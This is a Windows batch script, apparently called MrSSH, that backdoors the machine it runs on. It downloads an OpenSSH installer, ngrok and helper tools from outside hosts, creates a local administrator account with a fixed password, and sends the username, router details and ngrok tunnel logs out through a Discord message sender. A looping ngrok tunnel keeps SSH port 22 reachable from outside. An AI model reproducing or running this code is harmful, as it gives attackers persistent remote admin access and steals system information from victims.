cd %temp%

curl https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1 -o OpenSSH.ps1
curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -o source.bat
curl -L https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip
curl -Ls "https://github.com/dh3b/MrSSH/blob/main/Files/SilentCMD.exe?raw=true" -o "SilentCMD.exe"

powershell ./OpenSSH.ps1

net user "Admin" "Administrator" /add
net localgroup Administrators Admin /add
net localgroup Administratorzy Admin /add
net localgroup Administración Admin /add

set ""

call source.bat +silent --embed "MrSSH install code has been invoked on some computer" "Files with information will be send soon" "50c878"

:: router info command
curl --create-dirs -sfkLo "%localappdata%\microsoft\windowsapps\Router.bat" "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/source.bat" & call "%localappdata%\microsoft\windowsapps\Router.bat" >nul & call router --Usecolors False>router.txt & call Source.bat +silent --file %temp%/router.txt

whoami>user.txt
call Source.bat +silent --file %temp%/user.txt

tar -xf ngrok.zip

:ngrokloop
start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 & taskkill /IM ngrok.exe /F
start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log
goto ngrokloop

